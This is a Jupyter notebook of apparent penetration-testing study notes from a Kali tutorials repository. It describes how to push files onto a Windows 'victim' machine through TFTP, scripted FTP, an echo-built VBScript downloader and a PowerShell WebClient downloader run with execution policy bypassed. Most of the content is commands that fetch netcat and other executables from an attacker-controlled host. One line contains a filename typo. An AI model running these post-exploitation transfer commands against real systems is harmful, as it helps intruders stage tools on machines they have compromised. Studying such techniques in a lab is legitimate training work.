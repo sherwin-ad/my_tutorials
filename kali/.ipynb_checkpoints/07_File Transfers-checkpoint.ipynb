{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# TFTP\n",
    "\n",
    "Run in Kali Linux box\n",
    "\n",
    "$ atftpd --daemon --port 69 /root/tftp\n",
    "\n",
    "\n",
    "Run in Windows box victim\n",
    "\n",
    "$ tftp -i 192.168.56.103 GET nc.exe\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# FTP\n",
    "\n",
    "# Install pure-ftpd in Kali\n",
    "\n",
    "$ apt-get install pure-ftpd\n",
    "\n",
    "<img src=\"setup_ftp.png\" align=\"middle\">"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#!/bin/bash\n",
    "\n",
    "groupadd ftpgroup\n",
    "useradd -g ftpgroup -d /dev/null -s /etc ftpuser\n",
    "pure-pw useradd offsec -u ftpuser -d /ftphome\n",
    "pure-pw mkdb\n",
    "cd /etc/pure-ftpd/auth/\n",
    "ln -s ../conf/PureDB 60pdb\n",
    "mkdir -p /ftphome\n",
    "chown -R ftpuser:ftpgroup /ftphome/\n",
    "/etc/init.d/pure-ftpd restart\n",
    "\n",
    "echo open 192.168.56.103 21 > ftp.txt\n",
    "echo offsec >> ftp.txt\n",
    "echo ftpuser >> ftp.txt\n",
    "echo bin >> ftp.txt\n",
    "echo GET nc.exe >> ftp.txt\n",
    "echo bye >> ftp.txt\n",
    "ftp -s:ftp.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# VBScript Transfers\n",
    "\n",
    "# Copy the file you want to transfer to /var/www/ and restart apache service\n",
    "\n",
    "$ cp msgfmt.net.exe /var/www\n",
    "$ /etc/init.d/apache2 restart\n",
    "\n",
    "# Run this in windows client\n",
    "\n",
    "echo strUrl = WScript.Arguments.Item(0) > wget.vbs\n",
    "echo StrFile = WScript.Arguments.Item(1) >> wget.vbs\n",
    "echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs\n",
    "echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs\n",
    "echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs\n",
    "echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs\n",
    "echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs\n",
    "echo Err.Clear >> wget.vbs\n",
    "echo Set http = Nothing >> wget.vbs\n",
    "echo Set http = CreateObject(\"WinHttp.WinHttpRequest.5.1\") >> wget.vbs\n",
    "echo If http Is Nothing Then Set http = CreateObject(\"WinHttp.WinHttpRequest\") >> wget.vbs\n",
    "echo If http Is Nothing Then Set http = CreateObject(\"MSXML2.ServerXMLHTTP\") >> wget.vbs\n",
    "echo If http Is Nothing Then Set http = CreateObject(\"Microsoft.XMLHTTP\") >> wget.vbs\n",
    "echo http.Open \"GET\",strURL,False >> wget.vbs\n",
    "echo http.Send >> wget.vbs\n",
    "echo varByteArray = http.ResponseBody >> wget.vbs\n",
    "echo Set http = Nothing >> wget.vbs\n",
    "echo Set fs = CreateObject(\"Scripting.FileSystemObject\") >> wget.vbs\n",
    "echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs\n",
    "echo strData = \"\" >> wget.vbs\n",
    "echo strBuffer = \"\" >> wget.vbs\n",
    "echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs\n",
    "echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs\n",
    "echo Next >> wget.vbs\n",
    "echo ts.Close >> wget.vbs\n",
    "\n",
    "\n",
    "# Run the command to copy the file from the web server\n",
    "\n",
    "$ C:\\Windows\\system32>cscript wget.vbs http://192.168.56.102/msgfmt.net.exe msgfmt.exe\n",
    "\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<img src=\"vbscript.png\" align=\"middle\">"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Powershell Transfers\n",
    "\n",
    "# Run this command to Windows client\n",
    "\n",
    "echo $storageDir = $pwd > wget.ps1\n",
    "echo $webclient = New-Object System.Net.WebClient >>wget.ps1\n",
    "echo $url = \"http://192.168.56.102/msgfmt.net.exe\" >>wget.ps1\n",
    "echo $file = \"output-file.exe\" >>wget.ps1\n",
    "echo $webclient.DownloadFile($url,$file) >>wget.ps\n",
    "\n",
    "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
